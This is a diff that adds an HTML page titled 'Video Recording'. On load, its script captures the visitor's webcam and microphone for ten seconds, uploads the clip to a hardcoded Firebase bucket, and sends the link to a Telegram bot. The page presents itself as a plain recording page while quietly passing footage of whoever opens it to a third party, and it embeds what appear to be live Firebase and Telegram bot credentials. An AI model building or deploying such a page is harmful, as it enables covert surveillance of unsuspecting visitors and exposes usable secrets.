@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Video Recording</title>
+  <style>
+    #recorded-video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Video Recording</h1>
+  <video id="recorded-video" controls></video>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+  <script>
+    // Initialize Firebase
+    const firebaseConfig = {
+      apiKey: 'AIzaSyDeOU_XucStcft4sAVUAonm66ZAcjLrVgs',
+      authDomain: 'oneandonly-d6d6a-default-rtdb',
+      projectId: 'oneandonly-d6d6a',
+      storageBucket: 'oneandonly-d6d6a.appspot.com',
+      appId: '1:508820282657:android:67dd029d3cbc6f82a8b260'
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    // Get reference to the video element
+    const recordedVideo = document.getElementById('recorded-video');
+
+    // Start recording when the page loads
+    document.addEventListener('DOMContentLoaded', startRecording);
+
+    function startRecording() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function (stream) {
+          recordedVideo.srcObject = stream;
+          recordedVideo.style.display = 'block';
+
+          // Start recording
+          const mediaRecorder = new MediaRecorder(stream);
+          const chunks = [];
+          mediaRecorder.ondataavailable = function (e) {
+            chunks.push(e.data);
+          };
+          mediaRecorder.onstop = function () {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+
+            // Upload video to Firebase Storage
+            const storageRef = firebase.storage().ref();
+            const videoRef = storageRef.child('recorded_video.webm');
+            videoRef.put(blob).then(function (snapshot) {
+              // Get the download URL of the uploaded video
+              videoRef.getDownloadURL().then(function (url) {
+                sendVideoLink(url);
+              }).catch(function (error) {
+                console.error('Failed to get video download URL:', error);
+              });
+            }).catch(function (error) {
+              console.error('Failed to upload video:', error);
+            });
+          };
+
+          setTimeout(function () {
+            mediaRecorder.stop();
+            recordedVideo.srcObject = null;
+            recordedVideo.style.display = 'none';
+          }, 10000); // Stop recording after 10 seconds
+          mediaRecorder.start();
+        })
+        .catch(function (error) {
+          console.error('Error accessing media devices:', error);
+        });
+    }
+
+    // Send the video link to Telegram bot
+    function sendVideoLink(videoLink) {
+      const botToken = '6084936495:AAGdEF1aIn_Rc6-XDtBR2SK3m8KU6-W1Dko';
+      const chatId = '1580179552';
+      const message = `Video link: ${videoLink}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      fetch(url)
+        .then(function (response) {
+          if (response.ok) {
+            console.log('Message sent successfully to Telegram bot.');
+          } else {
+            console.error('Failed to send message to Telegram bot.');
+          }
+        })
+        .catch(function (error) {
+          console.error('Error sending message to Telegram bot:', error);
+        });
+    }
+  </script>
+</body>
+</html>
